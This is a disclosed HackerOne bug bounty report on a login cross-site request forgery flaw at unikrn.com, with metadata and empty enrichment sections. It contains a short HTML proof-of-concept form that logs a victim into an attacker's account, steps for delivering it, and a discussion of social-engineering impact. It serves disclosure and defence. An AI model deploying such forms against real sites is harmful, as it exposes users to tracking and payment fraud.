---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '339352'
original_report_id: '339352'
title: CSRF logs the victim into attacker's account
weakness: Cross-Site Request Forgery (CSRF)
team_handle: unikrn
created_at: '2018-04-17T04:02:11.403Z'
disclosed_at: '2018-04-19T15:58:26.596Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: unikrn.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF logs the victim into attacker's account

## Metadata

- HackerOne Report ID: 339352
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: unikrn
- Disclosed At: 2018-04-19T15:58:26.596Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description: There is no session validation while logging in which leads to csrf.

Steps To Reproduce:

  1. Create a CSRF login POC using the following code.
<html>
  <body>
    <form action="https://unikrn.com/apiv1/login" method="POST">
	  <input type="hidden" name="usr" value="[email]">
	  <input type="hidden" name="pwd" value="[password]">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
  
  2. Replace the email and password with the valid credentials.
  3. Send the script to the victim to make them click.

References:

1. You've rewarded a guy for login csrf here: https://hackerone.com/reports/293016
2. Impact of login csrf on a company: https://support.detectify.com/customer/portal/articles/1969819-login-csrf

## Impact

1. Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password and can also monitor the victim activities. 
2. Also the victim may add his paymet info in the attackers account unknowingly using your wallet feature.

The hacker selected the **Cross-Site Request Forgery (CSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://unikrn.com/apiv1/login

**Verified**
Yes

**Can a victim be forced to perform a sensitive state-change operation unknowningly?**
Yes

**What state-change operation can be performed?**
Any user details.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
